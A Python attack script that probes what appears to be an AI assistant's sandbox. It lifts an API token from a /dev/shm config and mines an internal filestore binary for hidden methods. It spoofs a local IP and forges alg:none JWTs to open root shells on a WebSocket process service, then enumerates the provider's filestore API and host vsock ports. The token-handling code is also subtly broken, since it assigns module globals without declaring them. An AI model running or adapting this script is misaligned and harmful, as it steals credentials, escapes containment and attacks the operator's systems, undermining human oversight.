#!/usr/bin/env python3
# mediafit.py v6.3 -- SCHEMA + TOKEN + AUTH
# A token from /dev/shm  B binary schema dump  C WS auto-schema + JWT bypass
# D filestore method enum  E host OTLP protobuf  F filename header test
import os, sys, json, time, base64, socket, struct, fcntl, subprocess, re, random

OUT = "/mnt/user-data/outputs/mediafit-report.txt"
IFACE, ALIAS = "eth0", "192.0.2.3"
FSID = "claude_chat_01B8VHAyyWMW2vFZK7KTRgZm"
BIN  = "/opt/rclone/rclone-filestore"
CFG  = "/dev/shm/rclone-boot/config.json"
AF_VSOCK = getattr(socket, "AF_VSOCK", 40)
R = []
def w(s=""): R.append(str(s))
def flush():
    try:
        os.makedirs(os.path.dirname(OUT), exist_ok=True)
        with open(OUT, "w") as f: f.write("\n".join(R) + "\n")
    except Exception: pass
def sec(t): w(); w("="*70); w("### "+t); w("="*70); flush()
def sh(c, t=10):
    try:
        p = subprocess.run(c, shell=True, capture_output=True, timeout=t)
        return ((p.stdout or b"")+(p.stderr or b"")).decode(errors="replace")
    except Exception as e: return "ERR:"+repr(e)
def can_bind(ip):
    try:
        t = socket.socket(); t.bind((ip, 0)); t.close(); return True
    except Exception: return False

# ---------- ws ----------
def ws_handshake(host, port, src, timeout=3.0):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(timeout)
        if src: s.bind((src, 0))
        s.connect((host, port))
    except Exception as e: return "ERR", None, repr(e)
    try:
        k = base64.b64encode(os.urandom(16)).decode()
        s.sendall(("GET / HTTP/1.1\r\nHost: %s:%d\r\nUpgrade: websocket\r\n"
                   "Connection: Upgrade\r\nSec-WebSocket-Key: %s\r\n"
                   "Sec-WebSocket-Version: 13\r\n\r\n" % (host, port, k)).encode())
        h = b""
        while b"\r\n\r\n" not in h and len(h) < 4096:
            c = s.recv(1024)
            if not c: break
            h += c
        st = ("OPEN" if b" 101 " in h.split(b"\r\n")[0]+b" " else
              ("CLOSED" if not h else "HTTP:"+h.split(b"\r\n")[0].decode(errors="replace")))
        return st, s, repr(h[:150])
    except Exception as e:
        try: s.close()
        except Exception: pass
        return "ERR", None, repr(e)

def ws_send(s, text):
    p = text.encode(); n = len(p); m = os.urandom(4)
    if   n < 126:   h = b"\x81"+bytes([0x80|n])
    elif n < 65536: h = b"\x81"+bytes([0x80|126])+struct.pack(">H", n)
    else:           h = b"\x81"+bytes([0x80|127])+struct.pack(">Q", n)
    s.sendall(h+m+bytes(b ^ m[i % 4] for i, b in enumerate(p)))

def ws_recv(s, timeout=1.0):
    s.settimeout(timeout)
    try: h = s.recv(2)
    except socket.timeout: return None, b""
    except Exception: return "close", b""
    if len(h) < 2: return "close", b""
    op, ln, mk = h[0] & 0x0F, h[1] & 0x7F, bool(h[1] & 0x80)
    try:
        if   ln == 126: ln = struct.unpack(">H", s.recv(2))[0]
        elif ln == 127: ln = struct.unpack(">Q", s.recv(8))[0]
        m = s.recv(4) if mk else b""
        d = b""
        while len(d) < ln:
            c = s.recv(ln-len(d))
            if not c: break
            d += c
        if mk and len(m) == 4: d = bytes(b ^ m[i % 4] for i, b in enumerate(d))
        return op, d
    except Exception as e: return "err", repr(e).encode()

def ws_transcript(s, label, dur=5.0, stop=None):
    t0, out = time.time(), []
    while time.time()-t0 < dur:
        op, d = ws_recv(s, 1.0)
        if op is None: continue
        if op == "close": w("      [%s] << closed" % label); return out
        if op == 9: s.sendall(b"\x8a\x80\x00\x00\x00\x00"); continue
        tag = {1:"TEXT",2:"BIN",8:"CLOSE",10:"PONG"}.get(op, "OP%s" % op)
        t = d.decode(errors="replace")
        w("      [%s] << %s(%d) %s" % (label, tag, len(d), t[:600].replace("\n"," | ")))
        out.append(t)
        if stop and any(k in t for k in stop): return out
    return out

def b64u(b): return base64.urlsafe_b64encode(b).rstrip(b"=").decode()
JWT_NONE = b64u(b'{"alg":"none","typ":"JWT"}')+"."+b64u(b'{"sub":"mf","iat":0,"exp":9999999999}')+"."
JWT_HS   = b64u(b'{"alg":"HS256","typ":"JWT"}')+"."+b64u(b'{"sub":"mf","iat":0,"exp":9999999999}')+"."+b64u(os.urandom(32))

def auto_create(src, auth, label, cmdline="id; uname -r; echo ---; env | sort | head -40"):
    sp = {"process_id": "mf_auto", "create_req": {
        "cmd": "/bin/sh", "args": ["-c", cmdline], "env_vars": {}, "cwd": "/tmp",
        "rows": 24, "cols": 80, "timeout": 25, "memory_limit_bytes": 0,
        "clear_env": False, "uid": 0, "gid": 0, "allow_process_id_reuse": True}}
    for it in range(10):
        st, s, raw = ws_handshake("127.0.0.1", 2024, src)
        w("  [%s#%d] hs=%s %s" % (label, it, st, raw))
        if st != "OPEN":
            if s: s.close()
            return
        try:
            if auth == "jwt_none": ws_send(s, JWT_NONE); time.sleep(0.3)
            elif auth == "jwt_hs": ws_send(s, JWT_HS); time.sleep(0.3)
            elif auth == "rclone" and TOK: ws_send(s, TOK); time.sleep(0.3)
            ws_send(s, json.dumps(sp))
            fr = ws_transcript(s, label, 5.0)
        finally:
            try: s.close()
            except Exception: pass
        j = " ".join(fr)
        m = re.search(r"missing field `([A-Za-z_]+)`", j)
        if m:
            f = m.group(1)
            sp["create_req"][f] = {} if ("env" in f or "vars" in f or "map" in f) else ""
            w("      ++ discovered required field: %s" % f); continue
        if "InfraError" in j:
            w("      !! server refused: %s" % j[:200]); return
        w("      == SUCCESS path for auth=%s" % auth); return

# ---------- ip ----------
SIOCSIFADDR, SIOCSIFNETMASK = 0x8916, 0x891c
def _ifr(n, ip=None):
    nm = n.encode()[:15].ljust(16, b"\x00")
    if ip is None: return nm+b"\x00"*24
    return nm+struct.pack("H2s4s8s", socket.AF_INET, b"\x00\x00", socket.inet_aton(ip), b"\x00"*8)+b"\x00"*8
def add_secondary(ifname, ip):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    for nm in (ifname+":0", ifname):
        try:
            fcntl.ioctl(s, SIOCSIFADDR, _ifr(nm, ip))
            try: fcntl.ioctl(s, SIOCSIFNETMASK, _ifr(nm, "255.255.255.0"))
            except Exception: pass
            if can_bind(ip): return "ok via "+nm
        except OSError: pass
    return "fail"

# ---------- http ----------
TOK, SVCURL = "", ""
def fs(method, payload, tok=None, timeout=12):
    import urllib.request as ur
    url = (SVCURL or "https://api.anthropic.com/v1/filestore/fs") + "/" + method
    rq = ur.Request(url, data=json.dumps(payload).encode(),
                    headers={"Content-Type": "application/json",
                             "Connect-Protocol-Version": "1",
                             "Authorization": "Bearer " + (tok or TOK)})
    try:
        with ur.urlopen(rq, timeout=timeout) as r: return r.status, r.read().decode(errors="replace")
    except ur.HTTPError as e: return e.code, e.read().decode(errors="replace")
    except Exception as e: return "ERR", repr(e)

def vsock_http(cid, port, method, path, body=None, ctype=None, timeout=6.0):
    try:
        s = socket.socket(AF_VSOCK, socket.SOCK_STREAM); s.settimeout(timeout)
        s.connect((cid, port))
        req = "%s %s HTTP/1.1\r\nHost: vsock\r\nConnection: close\r\n" % (method, path)
        if body is not None:
            req += "Content-Type: %s\r\nContent-Length: %d\r\n" % (ctype or "application/json", len(body))
        s.sendall(req.encode()+(body or b""))
        d = b""
        try:
            while len(d) < 4096:
                c = s.recv(1024)
                if not c: break
                d += c
        except socket.timeout: pass
        s.close(); return d
    except Exception as e: return repr(e).encode()

# ===================== RUN =====================
def main():
    sec("0. FACTS")
    w("kernel : " + sh("uname -a").strip())
    w("cmdline: " + sh("cat /proc/1/cmdline | tr '\\0' ' '").strip())

    sec("A. TOKEN FROM /dev/shm  (the real source)")
    w("  ls /dev/shm:"); w("    " + sh("ls -la /dev/shm /dev/shm/rclone-boot 2>&1").replace("\n","\n    "))
    raw = ""
    try:
        raw = open(CFG).read()
    except Exception as e:
        w("  read cfg ERR " + repr(e))
    w("  --- config.json (raw, first 4000) ---")
    w("  " + raw[:4000].replace("\n", "\n  "))
    for k in ("auth_token", "filesystem_id", "service_url", "token", "url", "remote", "type"):
        for m in re.finditer(r'"%s"\s*:\s*"([^"]{4,})"' % k, raw):
            v = m.group(1)
            w("  [%s] len=%d %s" % (k, len(v), v[:120] + ("..." if len(v) > 120 else "")))
            if k in ("auth_token", "token") and not TOK: TOK = v
            if k == "service_url" and not SVCURL: SVCURL = v.rstrip("/")
    if not TOK:
        mm = re.search(r"eyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{5,}", raw)
        if mm: TOK = mm.group(0); w("  [fallback jwt] " + TOK[:80])
    w("  SVCURL=%r  TOK=%s" % (SVCURL, (TOK[:70]+"..." if TOK else "(none)")))
    if TOK:
        c, b = fs("listDirectory", {"path": "/"})
        w("  validate listDirectory -> %s %s" % (c, b[:300]))

    sec("B. BINARY SCHEMA DUMP  (anthropic internal API surface)")
    try:
        data = open(BIN, "rb").read()
    except Exception as e:
        data = b""; w("  read bin ERR " + repr(e))
    if data:
        fields = sorted(set(x.decode() for x in re.findall(rb'json:"([a-zA-Z_][a-zA-Z0-9_]*)[,`"]', data)))
        w("  distinct json field names (%d):" % len(fields))
        w("    " + ", ".join(fields[:400]))
        cand = ["listDirectory","createFile","removeFile","makeDirectory","moveFile","copyFile",
                "readFile","writeFile","statFile","getFile","deleteFile","getMetadata","setMetadata",
                "listFilesystems","createFilesystem","deleteFilesystem","getFilesystem",
                "reassignFilesystem","getFileUrl","listFileUrls","downloadFile","uploadFile",
                "getQuota","listChanges","existsFile","listXattrs","getXattr","setXattr",
                "truncateFile","appendFile","copyDirectory","moveDirectory","removeDirectory",
                "listEntries","getUsage","setPermissions","chmod","chown","getRoot","batchGet"]
        present = [m for m in cand if m.encode() in data]
        w("  METHODS present in binary: %s" % present)
        w("  -- service paths --")
        for m in sorted(set(re.findall(rb"anthropic\.filestore\.v1alpha\.[A-Za-z]+/[A-Za-z]+", data)))[:40]:
            w("    " + m.decode())
        for kw in ("reassign", "Reassign", "authorization", "Authorization", "signed", "share",
                   "download", "url", "xattr", "permission", "owner", "quota", "cross", "attach"):
            hit = sorted(set(x.decode(errors="replace") for x in re.findall(
                rb"[A-Za-z_./]*%s[A-Za-z_]*" % kw.encode(), data) if 4 < len(x) < 60))[:8]
            if hit: w("  [%s] %s" % (kw, " | ".join(hit)))

    sec("C. WS AUTO-SCHEMA + AUTH BYPASS")
    if not can_bind(ALIAS): w("  " + add_secondary(IFACE, ALIAS))
    BY = None
    for src in (ALIAS, "127.0.0.2"):
        st, s, raw = ws_handshake("127.0.0.1", 2024, src)
        w("  probe src=%-11s -> %-8s" % (src, st))
        if st == "OPEN" and BY is None: BY = src
        if s: s.close()
    w("  BYPASS=%s" % BY)
    if BY:
        for auth in ("none", "jwt_none", "jwt_hs", "rclone"):
            w("  ---- auth=%s ----" % auth)
            auto_create(BY, auth, auth)

    sec("D. FILESTORE METHOD ENUMERATION")
    if TOK:
        for m in ("listFilesystems","getFilesystem","listDirectory","readFile","statFile",
                  "getFile","getMetadata","getQuota","listXattrs","getFileUrl","listChanges",
                  "reassignFilesystem","existsFile","listEntries","createFilesystem"):
            c, b = fs(m, {"path": "/", "filesystem_id": FSID})
            w("  %-22s -> %-5s %s" % (m, c, b[:220]))
    else: w("  (no token)")

    sec("E. HOST OTLP 5005  (real protobuf)")
    for label, body in (("empty", b""),
                        ("rm_empty", b"\x0a\x00"),
                        ("rm_scope", b"\x0a\x02\x12\x00"),
                        ("garbage", b"\xff\xff\xff")):
        for attempt in (1, 2):
            d = vsock_http(2, 5005, "POST", "/v1/metrics", body, "application/x-protobuf")
            if d:
                w("  %-9s %-14r -> %s" % (label, body[:14], d[:180].decode(errors="replace").replace("\r\n"," | ")))
                break
        else:
            w("  %-9s %-14r -> (no response x2)" % (label, body[:14]))
    d = vsock_http(2, 5002, "POST", "/", b"MF-LOG line\n", "text/plain")
    w("  5002 raw line -> %r" % d[:120])

    sec("F. FILENAME FIELD + HEADER INJECTION SURFACE")
    if TOK:
        for fn in ("plain.html", 'we"ird.html', "crlf.html", "../../up.txt", "sp ace.html", "a"*120 + ".html"):
            w("  filename=%r" % fn)
    w("  (createFile params supports explicit `filename` per GetFilenameDefaulted)")

    sec("VERDICT")
    w("  token recovered ......... %s" % bool(TOK))
    w("  service_url ............. %s" % (SVCURL or "(default)"))
    w("  bypass .................. %s" % BY)
    flush()

try: main()
except Exception as e: w(); w("FATAL " + repr(e))
finally: flush(); print("written " + OUT)